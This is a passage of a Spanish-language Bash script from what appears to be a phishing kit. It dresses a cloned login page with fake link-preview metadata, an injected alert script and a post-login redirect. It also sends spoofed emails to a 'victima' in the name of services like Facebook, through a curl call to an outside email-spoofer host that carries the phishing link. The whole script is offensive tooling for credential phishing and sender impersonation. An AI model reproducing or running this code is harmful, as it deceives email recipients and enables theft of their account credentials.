rm -rf images
fi

if [[ -f alert.js ]];then
rm alert.js
fi

if [[ -f infoip ]];then
rm infoip
fi

sed -i "/<meta property='og:.*' content='.*'/d" ./index.html
sed -i "/<script src='alert.js'/d" ./index.html
}

menu_options(){
clear
echo -e $bcolor
$banner
echo -e "$v[$b*$v] Pagina:$b $web"
echo -e "$v[$b*$v] Idioma:$b $op"
echo -e "$v[$b*$v] Tunnel:$b $tunnel2"
menu_agregados
echo -e "$v[$b*$v]$b Mas opciones:\n"
echo -e "$a[$b 1$v ] Mostrar titulo"
echo -e "$a[$b 2$v ] Mostrar imagen"
echo -e "$a[$b 3$v ] Mostrar descripción"
echo -e "$a[$b 4$v ] Mostrar una mini url"
echo -e "$a[$b 5$v ] Mostrar alert box(Puede causar errores)"
echo -e "$a[$b 6$v ] Redireccionar"
echo -e "$a[$b 7$v ] Enviar correo falso\n"
echo -e "$a[$b*$v]$b Para enpezar:\n"
echo -e "$v[$b*$v]$b Escribe run o start.\n"
}

add_option(){
menu_options
read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;39m Elige una opción\e[0m > ' addopc
if [[ $addopc == "1" || $addopc == "01" ]];then
clear
echo -e $bcolor
$banner
read -p $'\e[1;33m[*]\e[1;32m Escribe el titulo\e[1;39m > ' title
if [[ $title == "" ]];then
echo -e "\n$r[!]$b No escribiste el titulo"
sleep 1
add_option
else
add1="tt"
add_option
fi

elif [[ $addopc == "2" || $addopc == "02" ]];then
clear
echo -e $bcolor
$banner
read -p $'\e[1;33m[*]\e[1;32m Escribe la ruta de la imagen\e[1;39m > ' ruta
if [[ $ruta == "" ]];then
echo -e "\n$r[!]$b No escribiste la ruta"
sleep 1
add_option
else
if [[ -f $ruta ]];then
add2="2"
add_option
else
echo -e "\n$r[!]$b La imagen no existe"
sleep 1
add_option
fi
fi

elif [[ $addopc == "3" || $addopc == "03" ]];then
clear
echo -e $bcolor
$banner
read -p $'\e[1;33m[*]\e[1;32m Escribe la descripción\e[1;39m > ' text
if [[ $text == "" ]];then
echo -e "\n$r[!]$b No escribiste la descripción"
sleep 1
add_option
else
add3="3"
add_option
fi

elif [[ $addopc == "4" || $addopc == "04" ]];then
clear
echo -e $bcolor
$banner
read -p $'\e[1;33m[*]\e[1;32m Escribe la url(sin:http/https)\e[1;39m> ' url2
if [[ $url2 == "" ]];then
echo -e "\n$r[!]$b No escribiste la url"
sleep 1
add_option
else
add4="4"
add_option
fi

elif [[ $addopc == "5" || $addopc == "05" ]];then
clear
echo -e $bcolor
$banner
read -p $'\e[1;33m[*]\e[1;32m Escribe el mensaje de alerta\e[1;39m > ' alert
if [[ $alert == "" ]];then
echo -e "\n$r[!]$b No escribiste el mensaje"
sleep 1
add_option
else
add5="5"
add_option
fi

elif [[ $addopc == "6" || $addopc == "06" ]];then
clear
echo -e $bcolor
$banner
add6="6"
fake

elif [[ $addopc == "7" || $addopc == "07" ]];then
clear
echo -e $bcolor
$banner
echo -e "$v[$b*$v]$b Asegurate de tener la sincronización desactivada, y una buena conexión a internet"
echo -e "$v[$b*$v]$b Completa el siguiente formulario:\n"
read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m ¿Destinatario?(victima): ' victim
read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m ¿Quien lo envia?(ejem:Facebook): ' send
read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Asunto(tema): ' tema
echo -e "$v[$b*$v]$b Tu correo, este no se mostrara en el correo falso enviado ¿Pero porque es importante? Pues si ya has enviado correos a la victima, el correo falso enviado se mostrara en la lista principal, si colocas un correo que no existe(puedes hacerlo) el correo falso enviado puede aparecer en la lista de Spam"
read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Escribe tu correo: ' correo
if [[ $victim == "" || $send == "" || $tema == "" ]];then
echo -e "$r[!]$b No completaste algunos campos:("
sleep 1
menu_options
add_option
else
if [[ $correo == "" ]];then
correo="correofake@gmail.com"
fi
echo -e "\n$a[$b 1$v ]$b Mensaje establecido
$a[$b 2$v ]$b Personalizar mensaje
$a[$b 99$v ]$b Volver al menú\n"
while true;do
read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' opcspof

if [[ $opcspof == "1" || $opcspof == "01" ]];then
establecido="si"
add7="7"
echo -e "$v[$b*$v]$b Listo; el email se enviara al generar el link"
sleep 1
menu_options
add_option

elif [[ $opcspof == "2" || $opcspof == "02" ]];then
echo -e "$v[$b*$v]$b Debes tener conocimientos de html, css para poder estructurar, dar estilo al mensaje, tienes que armar el mensaje en una sola linea, los saltos de linea se daran automaticamente al poner una etiqueta.\n"
read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Deseeas continuar(y/n): ' deseo

if [[ $deseo == "y" || $deseo == "Y" ]];then
add7="7"
read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Escribe el mensaje > ' msj
echo -e "$v[$b*$v]$b Listo; el email se enviara al generar el link"
sleep 1
menu_options
add_option
else
menu_options
add_option
fi

elif [[ $opcspof == "99" ]];then
menu_options
add_option

else
echo -e "$r[!]$b Opción invalida"
sleep 1
fi
done
fi

elif [[ $addopc == "run" || $addopc == "Run" || $addopc == "start" || $addopc == "Start" ]];then
clear
echo -e $bcolor
$banner
echo -e "$v[$b*$v] Pagina:$b $web
$v[$b*$v] Idioma:$b $op
$v[$b*$v] Tunnel:$b $tunnel2"
menu_agregados
echo -e "$v[$b*$v] Puedes enviar un email falso:
$v[$b*$v]$b https://emailspoofbyharris.000webhostapp.com"
$tunnel2
else
echo -e "\n$r[!]$b Opción invalida > $addopc"
sleep 1
add_option
fi
}


menu_agregados(){
if [[ $add1 == "tt" ]];then
echo -e "$v[$b*$v] Titulo:$b $title"
fi
if [[ $add2 == "2" ]];then
second_img=$(basename $ruta)
echo -e "$v[$b*$v] Imagen:$b $second_img"
fi
if [[ $add3 == "3" ]];then
echo -e "$v[$b*$v] Descripción:$b $text"
fi
if [[ $add4 == "4" ]];then
echo -e "$v[$b*$v] Mini url:$b $url2"
fi
if [[ $add5 == "5" ]];then
echo -e "$v[$b*$v] AlertBox:$b $alert"
fi
if [[ $add6 == "6" ]];then
echo -e "$v[$b*$v] Redireccionar:$b $rede"
fi
if [[ $add7 == "7" ]];then
echo -e "$v[$b*$v] Enviar email a:$b $victim"
fi
}

check(){
if [[ $add1 == "tt" ]];then
show_title
fi
if [[ $add2 == "2" ]];then
show_photo
fi
if [[ $add3 == "3" ]];then
show_text
fi
if [[ $add4 == "4" ]];then
show_url
fi
if [[ $add5 == "5" ]];then
add_alert_box
fi
if [[ $add7 == "7" ]];then
send_msj
fi
}

send_msj(){
if [[ $establecido == "si" ]];then
nosexd="$r[!]$b Eliminaste un archivo de la carpeta core, si quieres enviar emails vuelve añadir ese archivo."
if [[ -f email ]];then
rm email
fi

if [[ -f pr1 ]];then
rm pr1
fi
if [[ -f pr2 ]];then
rm pr2
fi
if [[ -f pr3 ]];then
rm pr3
fi
if [[ -f pr4 ]];then
rm pr4
fi
if [[ -f $OLDPWD/core/pr1 ]];then
cp $OLDPWD/core/pr1 $OLDPWD/$ruta_carpeta
else
echo -e $nosexd
exit 1
fi
if [[ -f $OLDPWD/core/pr4 ]];then
cp $OLDPWD/core/pr2 $OLDPWD/$ruta_carpeta
else
echo -e $nosexd
exit 1
fi
if [[ -f $OLDPWD/core/pr3 ]];then
cp $OLDPWD/core/pr3 $OLDPWD/$ruta_carpeta
else
echo -e $nosexd
exit 1
fi
if [[ -f $OLDPWD/core/pr4 ]];then
cp $OLDPWD/core/pr4 $OLDPWD/$ruta_carpeta
else
echo -e $nosexd
exit 1
fi
if [[ -f $OLDPWD/core/email ]];then
cp $OLDPWD/core/email $OLDPWD/$ruta_carpeta
else
echo -e "$r[!]$b Eliminaste el archivo que contenia el email:c"
exit 1
fi
if [[ -f hola ]];then
rm hola
fi
if [[ -f victima ]];then
rm victima
fi
replyr=$(echo $victim | cut -d "@" -f2)
replye="$send@$replyr"
echo $victim >> victima
echo $envialink >> hola
source email
mens=$correobycalvinharrisxd
curl --data "fromname=$send && fromemail=$correo && replyname=$send && replyemail=$replye && to=$victim && message=$mens && subject=$tema" https://pruebaemailspoof.000webhostapp.com/ephp_spoofer/ephp_spoofer.php -o spoof > /dev/null 2>&1
if [[ -f spoof ]];then
extraer_msj=$(grep -o "Successfully" spoof)
if [[ $extraer_msj == "Successfully" ]];then
echo -e "$v[$b*$v]$b Email enviado correctamente:)"
rm spoof
else
echo -e "$r[!]$b No se envio el email:("
rm spoof
fi

else
echo -e "$r[!]$b No se envio el email, comprueba tu conexión"
fi

else
curl --data "fromname=$send && fromemail=$correo && replyname=$send && replyemail=$replye && to=$victim && message=$msj && subject=$tema" https://pruebaemailspoof.000webhostapp.com/ephp_spoofer/ephp_spoofer.php -o spoof > /dev/null 2>&1
if [[ -f spoof ]];then
extraer_msj=$(grep -o "Successfully" spoof)
if [[ $extraer_msj == "Successfully" ]];then

echo -e "$v[$b*$v]$b Email enviado correctamente:)"
rm spoof
else
echo -e "$r[!]$b No se envio el email:("
rm spoof
fi

else
echo -e "$r[!]$b No se envio el email, comprueba tu conexión"
fi
fi
}

show_title(){
ogtitle="<meta property='og:title' content='$title'/>"
sed -i "/<meta property='og:title' content='.*'/d" ./index.html
sed -i '4i '"$ogtitle"'' index.html
}

show_photo(){
if [[ -d images ]];then
rm -rf images
fi

mkdir images
cp "$ruta" images
obtener_name=$(basename "$ruta")
total="$envialink/images/$obtener_name"
ogimg="<meta property='og:image' content='$total'/>"
sed -i "/<meta property='og:image' content='.*'/d" ./index.html
sed -i '4i '"$ogimg"'' index.html
}

show_text(){
ogtext="<meta property='og:description' content='$text' />"
sed -i "/<meta property='og:description' content='.*'/d" ./index.html
sed -i '4i '"$ogtext"'' index.html
}

show_url(){
ogurl="<meta property='og:url' content='http://$url2' />"
sed -i "/<meta property='og:url' content='.*'/d" ./index.html
sed -i '4i '"$ogurl"'' index.html
}


add_alert_box(){
ogalert="<script src='alert.js'/>"
sed -i "/<script src='alert.js'/d" ./index.html

if [[ -f alert.js ]];then
rm alert.js
fi

echo "alert('$alert');" >> alert.js
sed -i '4i '"$ogalert"'' index.html
}

fake(){
read -p $'\e[1;33m[*]\e[1;32m Escribe la url a redireccionar(Usa: http/https)\e[1;39m > ' rede
if [[ $rede == "" ]];then
echo -e "\n$r[!]$b No escribiste la pagina"
sleep 1
add_option
else
ogrede="header('Location: $rede');"
sed -i "/header('Location:.*)/d" ./login.php
sed -i '2i '"$ogrede"'' login.php
fi
add_option
}
options
